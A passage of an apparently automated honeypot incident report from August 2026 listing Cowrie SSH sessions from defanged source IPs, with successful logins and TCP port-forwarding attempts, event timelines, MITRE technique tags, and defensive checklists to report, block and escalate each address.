| `2026-08-22 04:08:41` | `cowrie.client.version` |
| `2026-08-22 04:08:41` | `cowrie.client.kex` |
| `2026-08-22 04:08:42` | `cowrie.login.success` |
| `2026-08-22 04:08:42` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:08:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.146[.]109` to AbuseIPDB if not already reported
- [ ] Block `65.20.146[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e454e32b4a4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 04:09 |
| **Last Seen** | 2026-08-22 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:09:22` | `cowrie.session.connect` |
| `2026-08-22 04:09:22` | `cowrie.client.version` |
| `2026-08-22 04:09:22` | `cowrie.client.kex` |
| `2026-08-22 04:09:23` | `cowrie.login.success` |
| `2026-08-22 04:09:23` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:09:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 04:09:23` | `cowrie.direct-tcpip.data` |
| `2026-08-22 04:09:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faddf2738ad2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 04:09 |
| **Last Seen** | 2026-08-22 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:09:25` | `cowrie.session.connect` |
| `2026-08-22 04:09:25` | `cowrie.client.version` |
| `2026-08-22 04:09:25` | `cowrie.client.kex` |
| `2026-08-22 04:09:26` | `cowrie.login.success` |
| `2026-08-22 04:09:26` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:09:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 04:09:26` | `cowrie.direct-tcpip.data` |
| `2026-08-22 04:09:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b3fa6716b74

| Field | Detail |
|---|---|
| **Source IP** | `35.234.169[.]119` |
| **First Seen** | 2026-08-22 04:10 |
| **Last Seen** | 2026-08-22 04:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:10:57` | `cowrie.session.connect` |
| `2026-08-22 04:10:57` | `cowrie.client.version` |
| `2026-08-22 04:10:57` | `cowrie.client.kex` |
| `2026-08-22 04:10:58` | `cowrie.login.success` |
| `2026-08-22 04:10:59` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.234.169[.]119` to AbuseIPDB if not already reported
- [ ] Block `35.234.169[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfa759b5a112

| Field | Detail |
|---|---|
| **Source IP** | `95.153.108[.]140` |
| **First Seen** | 2026-08-22 04:11 |
| **Last Seen** | 2026-08-22 04:11 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:11:06` | `cowrie.session.connect` |
| `2026-08-22 04:11:07` | `cowrie.client.version` |
| `2026-08-22 04:11:07` | `cowrie.client.kex` |
| `2026-08-22 04:11:10` | `cowrie.login.success` |
| `2026-08-22 04:11:11` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.153.108[.]140` to AbuseIPDB if not already reported
- [ ] Block `95.153.108[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b603adf33239

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 04:19 |
| **Last Seen** | 2026-08-22 04:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:19:12` | `cowrie.session.connect` |
| `2026-08-22 04:19:12` | `cowrie.client.version` |
| `2026-08-22 04:19:12` | `cowrie.client.kex` |
| `2026-08-22 04:19:13` | `cowrie.login.success` |
| `2026-08-22 04:19:13` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:19:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 04:19:13` | `cowrie.direct-tcpip.data` |
| `2026-08-22 04:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cf65ac9e546

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 04:19 |
| **Last Seen** | 2026-08-22 04:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:19:16` | `cowrie.session.connect` |
| `2026-08-22 04:19:16` | `cowrie.client.version` |
| `2026-08-22 04:19:16` | `cowrie.client.kex` |
| `2026-08-22 04:19:17` | `cowrie.login.success` |
| `2026-08-22 04:19:17` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:19:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 04:19:17` | `cowrie.direct-tcpip.data` |
| `2026-08-22 04:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac796648d7f1

| Field | Detail |
|---|---|
| **Source IP** | `175.101.14[.]77` |
| **First Seen** | 2026-08-22 04:19 |
| **Last Seen** | 2026-08-22 04:19 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:19:20` | `cowrie.session.connect` |
| `2026-08-22 04:19:20` | `cowrie.client.version` |
| `2026-08-22 04:19:20` | `cowrie.client.kex` |
| `2026-08-22 04:19:27` | `cowrie.login.success` |
| `2026-08-22 04:19:28` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:19:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.101.14[.]77` to AbuseIPDB if not already reported
- [ ] Block `175.101.14[.]77` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3749a9e7b52

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 04:29 |
| **Last Seen** | 2026-08-22 04:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:29:02` | `cowrie.session.connect` |
| `2026-08-22 04:29:02` | `cowrie.client.version` |
| `2026-08-22 04:29:02` | `cowrie.client.kex` |
| `2026-08-22 04:29:03` | `cowrie.login.success` |
| `2026-08-22 04:29:03` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:29:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 04:29:03` | `cowrie.direct-tcpip.data` |
| `2026-08-22 04:29:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a8b18f83938

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 04:29 |
| **Last Seen** | 2026-08-22 04:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:29:05` | `cowrie.session.connect` |
| `2026-08-22 04:29:05` | `cowrie.client.version` |
| `2026-08-22 04:29:06` | `cowrie.client.kex` |
| `2026-08-22 04:29:07` | `cowrie.login.success` |
| `2026-08-22 04:29:07` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:29:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 04:29:07` | `cowrie.direct-tcpip.data` |
| `2026-08-22 04:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c173f68d2ca1

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-22 04:34 |
| **Last Seen** | 2026-08-22 04:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:34:44` | `cowrie.session.connect` |
| `2026-08-22 04:34:44` | `cowrie.client.version` |
| `2026-08-22 04:34:44` | `cowrie.client.kex` |
| `2026-08-22 04:34:45` | `cowrie.login.success` |
| `2026-08-22 04:34:45` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:34:45` | `cowrie.direct-tcpip.data` |
| `2026-08-22 04:34:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d40cf4dd2b9

| Field | Detail |
|---|---|
| **Source IP** | `103.7.60[.]253` |
| **First Seen** | 2026-08-22 04:34 |
| **Last Seen** | 2026-08-22 04:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:34:45` | `cowrie.session.connect` |
| `2026-08-22 04:34:46` | `cowrie.client.version` |
| `2026-08-22 04:34:46` | `cowrie.client.kex` |
| `2026-08-22 04:34:51` | `cowrie.login.success` |
| `2026-08-22 04:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.7.60[.]253` to AbuseIPDB if not already reported
- [ ] Block `103.7.60[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed65ef483e2b

| Field | Detail |
|---|---|
| **Source IP** | `117.2.123[.]19` |
| **First Seen** | 2026-08-22 04:34 |
| **Last Seen** | 2026-08-22 04:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:34:58` | `cowrie.session.connect` |
| `2026-08-22 04:34:59` | `cowrie.client.version` |
| `2026-08-22 04:34:59` | `cowrie.client.kex` |
| `2026-08-22 04:35:01` | `cowrie.login.success` |
| `2026-08-22 04:35:02` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:35:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.2.123[.]19` to AbuseIPDB if not already reported
- [ ] Block `117.2.123[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-675a0e946505

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-08-22 04:36 |
| **Last Seen** | 2026-08-22 04:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:36:16` | `cowrie.session.connect` |
| `2026-08-22 04:36:17` | `cowrie.client.version` |
| `2026-08-22 04:36:17` | `cowrie.client.kex` |
| `2026-08-22 04:36:20` | `cowrie.login.success` |
| `2026-08-22 04:36:20` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b375c7d60b50

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 04:38 |
| **Last Seen** | 2026-08-22 04:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:38:44` | `cowrie.session.connect` |
| `2026-08-22 04:38:44` | `cowrie.client.version` |
| `2026-08-22 04:38:44` | `cowrie.client.kex` |
| `2026-08-22 04:38:45` | `cowrie.login.success` |
| `2026-08-22 04:38:45` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:38:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 04:38:45` | `cowrie.direct-tcpip.data` |
| `2026-08-22 04:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3e3ce613601

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 04:38 |
| **Last Seen** | 2026-08-22 04:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:38:48` | `cowrie.session.connect` |
| `2026-08-22 04:38:48` | `cowrie.client.version` |
| `2026-08-22 04:38:48` | `cowrie.client.kex` |
| `2026-08-22 04:38:49` | `cowrie.login.success` |
| `2026-08-22 04:38:49` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:38:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 04:38:49` | `cowrie.direct-tcpip.data` |
| `2026-08-22 04:38:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52d537b63215

| Field | Detail |
|---|---|
| **Source IP** | `61.184.128[.]210` |
| **First Seen** | 2026-08-22 04:41 |
| **Last Seen** | 2026-08-22 04:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:41:29` | `cowrie.session.connect` |
| `2026-08-22 04:41:30` | `cowrie.client.version` |
| `2026-08-22 04:41:30` | `cowrie.client.kex` |
| `2026-08-22 04:41:33` | `cowrie.login.success` |
| `2026-08-22 04:41:34` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:41:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.184.128[.]210` to AbuseIPDB if not already reported
- [ ] Block `61.184.128[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a054f77f638

| Field | Detail |
|---|---|
| **Source IP** | `220.246.33[.]79` |
| **First Seen** | 2026-08-22 04:43 |
| **Last Seen** | 2026-08-22 04:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:43:46` | `cowrie.session.connect` |
| `2026-08-22 04:43:47` | `cowrie.client.version` |
| `2026-08-22 04:43:47` | `cowrie.client.kex` |
| `2026-08-22 04:43:51` | `cowrie.login.success` |
| `2026-08-22 04:43:52` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:43:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.33[.]79` to AbuseIPDB if not already reported
- [ ] Block `220.246.33[.]79` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08980458a515

| Field | Detail |
|---|---|
| **Source IP** | `211.58.176[.]42` |
| **First Seen** | 2026-08-22 04:43 |
| **Last Seen** | 2026-08-22 04:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:43:57` | `cowrie.session.connect` |
| `2026-08-22 04:43:58` | `cowrie.client.version` |
| `2026-08-22 04:43:58` | `cowrie.client.kex` |
| `2026-08-22 04:44:00` | `cowrie.login.success` |
| `2026-08-22 04:44:01` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.58.176[.]42` to AbuseIPDB if not already reported
- [ ] Block `211.58.176[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76d6fbd0198f

| Field | Detail |
|---|---|
| **Source IP** | `112.26.99[.]93` |
| **First Seen** | 2026-08-22 04:44 |
| **Last Seen** | 2026-08-22 04:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:44:04` | `cowrie.session.connect` |
| `2026-08-22 04:44:05` | `cowrie.client.version` |
| `2026-08-22 04:44:05` | `cowrie.client.kex` |
| `2026-08-22 04:44:07` | `cowrie.login.success` |
| `2026-08-22 04:44:08` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:44:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.99[.]93` to AbuseIPDB if not already reported
- [ ] Block `112.26.99[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b15e60e626c7

| Field | Detail |
|---|---|
| **Source IP** | `175.206.1[.]60` |
| **First Seen** | 2026-08-22 04:44 |
| **Last Seen** | 2026-08-22 04:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:44:14` | `cowrie.session.connect` |
| `2026-08-22 04:44:14` | `cowrie.client.version` |
| `2026-08-22 04:44:14` | `cowrie.client.kex` |
| `2026-08-22 04:44:16` | `cowrie.login.success` |
| `2026-08-22 04:44:17` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:44:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.206.1[.]60` to AbuseIPDB if not already reported
- [ ] Block `175.206.1[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b89533cad6b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 04:48 |
| **Last Seen** | 2026-08-22 04:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:48:26` | `cowrie.session.connect` |
| `2026-08-22 04:48:26` | `cowrie.client.version` |
| `2026-08-22 04:48:26` | `cowrie.client.kex` |
| `2026-08-22 04:48:27` | `cowrie.login.success` |
| `2026-08-22 04:48:27` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:48:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 04:48:27` | `cowrie.direct-tcpip.data` |
| `2026-08-22 04:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1220bc27d796

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 04:48 |
| **Last Seen** | 2026-08-22 04:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:48:30` | `cowrie.session.connect` |
| `2026-08-22 04:48:30` | `cowrie.client.version` |
| `2026-08-22 04:48:30` | `cowrie.client.kex` |
| `2026-08-22 04:48:31` | `cowrie.login.success` |
| `2026-08-22 04:48:31` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:48:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 04:48:31` | `cowrie.direct-tcpip.data` |
| `2026-08-22 04:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04240848e8de

| Field | Detail |
|---|---|
| **Source IP** | `61.12.86[.]90` |
| **First Seen** | 2026-08-22 04:51 |
| **Last Seen** | 2026-08-22 04:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:51:43` | `cowrie.session.connect` |
| `2026-08-22 04:51:44` | `cowrie.client.version` |
| `2026-08-22 04:51:44` | `cowrie.client.kex` |
| `2026-08-22 04:51:46` | `cowrie.login.success` |
| `2026-08-22 04:51:47` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.86[.]90` to AbuseIPDB if not already reported
- [ ] Block `61.12.86[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-007bf00f7147

| Field | Detail |
|---|---|
| **Source IP** | `61.12.86[.]90` |
| **First Seen** | 2026-08-22 04:51 |
| **Last Seen** | 2026-08-22 04:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:51:52` | `cowrie.session.connect` |
| `2026-08-22 04:51:53` | `cowrie.client.version` |
| `2026-08-22 04:51:53` | `cowrie.client.kex` |
| `2026-08-22 04:51:54` | `cowrie.login.success` |
| `2026-08-22 04:51:55` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.86[.]90` to AbuseIPDB if not already reported
- [ ] Block `61.12.86[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
